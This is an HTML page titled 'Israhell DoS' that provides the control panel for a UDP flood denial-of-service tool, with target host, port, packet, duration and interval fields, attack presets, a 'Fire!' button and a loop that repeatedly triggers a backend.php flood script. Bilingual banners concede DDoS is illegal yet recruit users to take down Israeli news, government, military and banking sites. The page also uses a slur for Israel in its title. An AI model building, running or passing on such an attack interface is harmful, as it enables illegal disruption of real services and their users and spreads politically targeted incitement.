<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="">
        <title>Israhell DoS</title>
        <!-- Bootstrap core CSS -->
        <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
        <!-- Custom styles for this template -->
        <link href="style.css" rel="stylesheet">
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    </head>
    <body>
        <nav class="navbar navbar-inverse navbar-fixed-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="#">Israhell DoS</a>
                </div>
                <div id="navbar" class="collapse navbar-collapse">
                    <ul class="nav navbar-nav">
                        <li class="active">
                            <a href="/">Home</a>
                        </li>
                    </ul>
                </div>
                <!--/.nav-collapse -->
            </div>
        </nav>
        <div class="container">
</div>
        <!-- /.container -->
        <!-- Bootstrap core JavaScript
    ================================================== -->
        <!-- Placed at the end of the document so the pages load faster -->
        <div class="container" style="margin-top: 39px;">
            <div class="alert alert-danger alert-dismissible fade in" role="alert"> 
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>                 
                <h4><b>AMARAN !</b></h4> 
                <p style="font-size: 19px;">Tindakan DoSing atau menyertai DDoS masih menyalahi undang-undang. Klik pada teruskan jika anda ingin menyokong Israel dalam menghapuskan laman berita propaganda, kerajaan, ketenteraan dan perbankan Zionist. Leave Continue</p>
                <p style="font-size: 19px;"></p>
                <p style="font-size: 19px;"></p>
                <p style="font-size: 19px;"></p> 
                <p> </p> 
            </div>
            <div class="alert alert-danger alert-dismissible fade in" role="alert"> 
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>                 
                <h4><b>WARNING !</b></h4> 
                <p style="font-size: 19px;">The action of DoSing or participating in DDoS is still illegal. Click on continue if you wish to support Palestine in taking down Israel propaganda news, government, military and banking sites.</p>
                <p style="font-size: 19px;"></p>
                <p style="font-size: 19px;"></p>
                <p style="font-size: 19px;"></p> 
                <p> </p> 
            </div>
        </div>
        <div class="container"> 
            <!--
  ui.html
   
	Script to perform a DDoS UDP Flood by PHP
 
	This tool is written on educational purpose, please use it on your own good faith.
  
  GNU General Public License version 2.0 (GPLv2)
	@version	0.1

-->             
            <!DOCTYPE html> 
            <html> 
                <head>                   
                    <meta http-equiv="content-type" content="text/html;charset=utf-8"/> 
                    <meta name="generator" content="Geany 1.23.1"/> 
                    <script>
		// microAjax - https://github.com/TheZ3ro/microajax/
		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
	</script>                     
                </head>                 
                <body>
                <h4><b>LOW ORBIT ION CANON !</b></h4> 
                    <div class="col-md-4" style="max-width: 518px; min-width: 344px;">
                        <div id="ddos" style="border-right-style: solid; border-right-width: 0px; padding: 14px 20px; max-width: 417px;" data-form-type="other" class="text-muted">
                            <button id="loadLag" onClick="javascript:lagConfig();">Lag config</button>         
                            <button id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>          
                            <br/> 
                            <br/>
                            <label>Host:</label>     
                            <input type="text" id="host"> 
                            <br/> 
                            <label>Port:</label>
                            80 Default         
                            <input type="number" id="port" max="65535" min="1" step="1" value="80"> 
                            <br/> 
                            <label>Packet:</label>         
                            <input type="number" id="packet" min="1" step=""> 
                            <label>65000 Default</label>         
                            <br/> 
                            <label>Time:</label>         
                            <input type="number" id="time" min="1" step="1" value=""> 
                            <label>10 Default</label>         
                            <br/> 
                            <label>Bytes:</label>         
                            <input type="number" id="bytes" max="65000" min="1" step="1" value="65000"> 
                            <label>Min 1 / Max 65000</label>         
                            <br/> 
                            <label>Interval:</label>         
                            <input type="number" id="interval" max="10000" min="1" step="1" value="10"> 
                            <label>Min 1 / Max 10000</label>         
                            <br/> 
                            <label>Pass:</label>         
                            <input type="text" id="pass"> 
                            <label>Constant attack with smart delays</label>         
                            <br/> 
                            <br/> 
                            <button id="send" onClick="javascript:fire();">Fire!</button>         
                            <br/> 
                            <br/> 
                            <br/> 
                        </div>     
                    </div>
                    <div class="col-md-4" style="max-width: 518px; min-width: 344px;">
                        <div id="ddos" style="border-right-style: solid; border-right-width: 0px; padding: 14px 20px; max-width: 417px;" data-form-type="other" class="text-muted">
                            <button id="sendWithInterval" onclick="javascript:constantAttack(true);" data-dashlane-label="true" data-dashlane-rid="68c332a9b4ff2923" data-form-type="action">Start</button>                             
                            <button id="stopInterval" disabled="true" onclick="javascript:constantAttack(false);" data-dashlane-label="true" data-dashlane-rid="7f0f0969a998c9d1" data-form-type="other">Stop</button>
                            <br>
                            <br>
                            <textarea readonly="" id="log" rows="10" cols="50" style="padding: 14px 10px; max-width: 417px; max-width: 302px;color: green;background-color: black;" data-dashlane-rid="1bc0b802566ba69a" data-form-type="other">It may delay for few seconds when you hit start or fire button</textarea> 
                        </div>
                    </div>
                    <script>
		var _log=document.getElementById("log");
		var intervalHandler = null;
		function fire(){
			var host=document.getElementById("host").value;
			var port=document.getElementById("port").value;
			var packet=document.getElementById("packet").value;
			var time=document.getElementById("time").value;
			var pass=document.getElementById("pass").value;
			var bytes=document.getElementById("bytes").value;
			var interval=document.getElementById("interval").value;
			
			
			if(host!="" && pass!=""){
				inputLock(true);
				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
				console.log(url);
				microAjax(url, function(result) { 
				_log.value=result;
				if(_log.value.includes("Wrong password")){
					constantAttack(false);
				}
				if(intervalHandler == null){
					inputLock(false);
				}
				});
			}
			else{
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function lagConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "10";
			bytes=document.getElementById("bytes").value = "1";
			interval=document.getElementById("interval").value = "0";
		}
		
		function trafficConfig(){
			packet=document.getElementById("packet").value = "";
			time=document.getElementById("time").value = "5";
			bytes=document.getElementById("bytes").value = "65000";
			interval=document.getElementById("interval").value = "10";
		}
		
		function constantAttack(status){
			var host=document.getElementById("host").value;
			var host=document.getElementById("pass").value;
			var intervalTime=(document.getElementById("time").value * 1000) + 1000;
			if(host!="" && pass!=""){
				if(status == true){
					fire();
					inputLock(true);
					intervalHandler = setInterval(fire,intervalTime);
				}
				else if(status == false){
					clearInterval(intervalHandler);
					inputLock(false);
					intervalHandler = null;
				}
			}
			else{
				_log.value = "Not all required parameters are filled correctly!"
			}
		}
		
		function inputLock(status){
			var inputs = document.getElementsByTagName("input");
			var buttons = document.getElementsByTagName("button");
			if(status == true){
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = true;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = true;
				}
				document.getElementById("stopInterval").disabled = false;
			}
			else{
				for(i = 0;i < inputs.length;i++)
				{
					inputs[i].disabled = false;
				}
				for(i = 0;i < buttons.length;i++)
				{
					buttons[i].disabled = false;
				}
				document.getElementById("stopInterval").disabled = true;
			}
		}
	</script>                     
                </body>                 
            </html>                          
        </div>
        <script src="assets/js/jquery.min.js"></script>
        <script src="bootstrap/js/bootstrap.min.js"></script>
        <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
        <script src="assets/js/ie10-viewport-bug-workaround.js"></script>
    </body>
</html>
